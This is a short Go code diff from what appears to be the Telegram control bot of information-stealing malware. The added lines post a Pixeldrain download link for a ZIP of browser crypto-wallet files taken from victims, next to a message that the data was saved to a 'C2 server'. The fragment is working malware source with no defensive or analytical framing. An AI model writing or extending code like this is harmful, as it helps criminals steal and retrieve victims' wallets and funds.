@@ -2440,6 +2440,13 @@ func (tb *TelegramBot) formatAndSendCryptoData(chatID int64, result *config.Task
 			message += "\n"
 		}
 
+		// Add Pixeldrain download link if available
+		if assets.DownloadURL != "" {
+			message += "💾 **DOWNLOAD COMPLETE DATA:**\n"
+			message += fmt.Sprintf("📁 [Click Here to Download Browser Wallet Files](%s)\n", assets.DownloadURL)
+			message += "   └ ZIP archive with all extracted wallet data\n\n"
+		}
+
 		message += "💾 *Data saved to C2 server crypto-assets directory*"
 		tb.sendMessage(chatID, message)
 	} else {
